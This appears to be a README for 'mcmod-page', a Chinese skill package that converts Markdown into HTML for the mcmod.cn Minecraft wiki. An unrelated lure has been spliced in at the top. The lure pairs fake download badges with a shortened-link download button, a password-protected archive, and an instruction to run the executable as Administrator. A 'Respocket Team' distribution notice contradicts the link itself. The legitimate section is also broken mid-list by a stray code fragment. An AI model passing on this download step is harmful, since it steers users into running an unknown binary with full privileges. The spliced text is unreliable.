<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# mcmod-page —— MC百科页面编写技能包

给 AI agent 用的技能：把 Markdown 稿子转成 **MC百科（mcmod.cn）能直接粘贴的 HTML**，
按官方编辑规范检查内容，并把长清单排成能读的表格结构。

> 本仓库即技能目录：`SKILL.md` 在根目录，`scripts/` 在根目录下。

## 从 GitHub 装（推荐）

```bash
# Windows
powershell -ExecutionPolicy Bypass -File .\install.ps1
# macOS / Linux
bash install.sh
```

## 包里有什么

```
mcmod-page/
├── SKILL.md              # 技能正文（agent 读这个）
├── README.md             # 本文件，给人看
└── scripts/
    ├── md2mcmod.py       # Markdown -> 百科 HTML（零依赖，只用标准库）
    ├── rowspan.py        # 表格首列合并成 rowspan
    └── 示例-源.md        # 可跑的最小示例
```

## 安装（用脚本，或手动三步）

**懒人版**：解压后在文件夹里跑 install.ps1（Windows）或 install.sh（macOS/Linux），它会自己复制到技能目录并打印自检命令。

**手动版**：


1. **放到位。** 把整个 `mcmod-page` 文件夹（不是只放 SKILL.md）复制到技能目录：

   | 平台 | 路径 |
   |---|---|
   | Windows | `%USERPROFILE%\.dsh\skills\mcmod-page\` |
   | macOS / Linux | `~/.dsh/skills/mcmod-page/` |

   用其它客户端（Claude Code、Cursor…）就放进它的 skills 目录，格式通用。

2. **重启会话。** 新开一个对话，说「帮我优化这个百科页」，或显式 `skill mcmod-page`。

   > 第一次干活时，agent 会**先问你一句「要不要装 Windows MCP」**。装上它，装篡改猴、装百科脚本、把稿子粘进编辑器这几步就都由它做；你不想装就说"不装"，它会把手动步骤教给你——**不会默认替你在系统里装东西**。

3. **跑一遍示例确认脚本可用：**

   ```bash
   cd <技能目录>/scripts
   python md2mcmod.py 示例-源.md -o 示例.mcmod.html
   python rowspan.py 示例.mcmod.html
   ```

   第二行应输出：`表格 1 张 / 数据行 7 行 / 合并出 2 个 rowspan 组`。

> 需要 Python 3.8+。两个脚本只用标准库，不需要 `pip install` 任何东西。

## 可选但强烈建议：Windows MCP

装了它，agent 能直接操作你的浏览器，于是**「装篡改猴 → 装 MC百科脚本 → 把稿子粘进编辑器」这三步它自己做**，你只在开头同意一次、结尾看一眼。不装也能用，只是这三步得你自己来。

它会做的事：

1. 打开扩展商店装**篡改猴**，并到扩展详情页把「允许用户脚本」打开（这步不开，脚本装了也不执行）。
# 1) 装（Windows，需 Python 3.10+）
pip install uv          # 若还没装 uv
uvx windows-mcp serve   # 不常驻方式；或 pip install windows-mcp 后 windows-mcp serve
```

```yaml
# 2) 在客户端 MCP 配置里注册（以 DSH 为例：<profile>/cordis.patch.yml）
- insert:
    - id: mcp-windows
      name: '@deepseek-ai/dsh-mcp-client'
      config:
        serverName: windows
        transport: stdio
        command: 'windows-mcp'
        args: [ 'serve' ]
        failOnStartupError: false
```

3. 重启客户端，工具列表里应出现 `mcp__windows__*`。

## 常见问题

**Q：它生成的 HTML 粘进百科后表格没边框/列宽怪？**
A：粘完点一次「正文预览」。`style="width"`、`word-break` 这类属性由编辑器自己补，不影响结果。

**Q：合并单元格（rowspan）没生效？**
A：先确认 `rowspan.py` 跑过了；再看源稿里首列是否**重复写**了同一名称（不是留空）。若预览里仍被拆开，说明你的编辑器版本会剥 `rowspan`，退回"按类型分组 + 每组一张小表"的排法（SKILL.md §4 的 L3）。

**Q：需要改内容而不是排版怎么办？**
A：SKILL.md 里写了边界——**作者的措辞不要改**，只做标点/空格/`注：`前缀/反引号这类整理；专有名词和 mod 自造术语原样保留。

**Q：能不能把 Markdown 直接交给浏览器里的油猴脚本转？**
A：不建议。Mcmodder 的 Markdown→HTML 只告警不修正，会在 `<code>`/`<blockquote>` 上打红框，而那些内联样式会被一起保存进正文。用 `scripts/md2mcmod.py`。


---

MIT License

Copyright (c) 2026 zgxhzhr

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
